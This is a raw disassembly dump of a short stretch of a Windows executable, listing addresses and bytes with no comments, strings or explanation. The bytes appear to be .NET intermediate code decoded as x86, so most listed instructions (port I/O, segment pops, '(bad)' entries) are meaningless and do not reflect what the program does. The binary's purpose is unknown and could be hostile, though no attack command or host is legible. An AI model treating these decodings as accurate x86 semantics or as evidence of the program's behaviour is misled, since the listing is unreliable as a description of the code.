  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 76       	add    $0x76720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 7e 21       	and    $0x217e7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 e8    	or     -0x178de7db(%edx),%ah
  4031e4:	21 00                	and    %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 fa    	or     -0x58de5db(%edx),%ah
  4031f5:	21 00                	and    %eax,(%eax)
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 0e             	or     0xe(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 6c             	or     0x6c(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 6c             	or     0x6c(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 70                	jb     0x403333
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 7a             	or     %esi,0x7a(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 8e                	jb     0x403274
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 ae                	jb     0x4032a0
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 6c             	or     0x6c(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 c4                	jb     0x4032d2
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 cc                	jb     0x4032f0
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 d8                	jb     0x403308
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 e8                	jb     0x403455
  40346d:	22 00                	and    (%eax),%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 ee             	adc    %esi,-0x12(%edx)
  4034ae:	22 00                	and    (%eax),%al
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 34 23    	or     0x23347209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	4e                   	dec    %esi
  4034ec:	23 00                	and    (%eax),%eax
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 7a             	or     %esi,0x7a(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 86             	or     -0x7a(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	96                   	xchg   %eax,%esi
  403521:	23 00                	and    (%eax),%eax
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 7a                	jb     0x4035ab
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 a4             	or     -0x5c(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 ba             	adc    %esi,-0x46(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
